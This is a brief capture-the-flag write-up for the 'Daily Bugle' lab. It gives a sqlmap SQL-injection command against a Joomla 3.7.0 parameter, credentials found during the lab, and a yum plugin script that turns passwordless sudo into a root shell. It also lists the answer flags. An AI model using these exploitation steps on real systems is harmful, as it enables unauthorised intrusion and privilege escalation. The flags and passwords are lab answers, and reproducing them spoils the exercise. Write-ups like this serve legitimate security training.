# DAILY BUGLE

## BASIC INFO

```
export IP=10.10.132.139

```
> - **Access the web serer, who robbed the bank?**
>> Spiderman

## OBTAIN USER AND ROOT

> - **What is the Joomla version?**
>> 3.7.0

> - **What is Jonah's craacked password?**
>> spiderman123
```
sqlmap -u "http://10.10.132.139/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Search for vulnerabilities of Joomla. Found out we can have RCE on the template page. Using reverse shell from pentestmonkey we got a reverse shell. Then enumerate the machine with linPeas. Found credentials:\

`jjameson:nv5uz9r3ZEDzVjNu`

ssh into machine with above credentials

> - **What is the user flag?**
>> 27a260fe3cba712cfdedb1c86d80442e

Running sudo -l we see that we can run yum as sudo without password\
Goinf to [gtfo bin](https://gtfobins.github.io) we search for yum.
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
cd into tmp and create a file name shell. Copy this into shell and make it executable. THen run it and we are root now.
> - **What is the root flag?**
>> eec3d53292b1821868266858d7fa6f79

![badges](../../../badges/dianchia.png)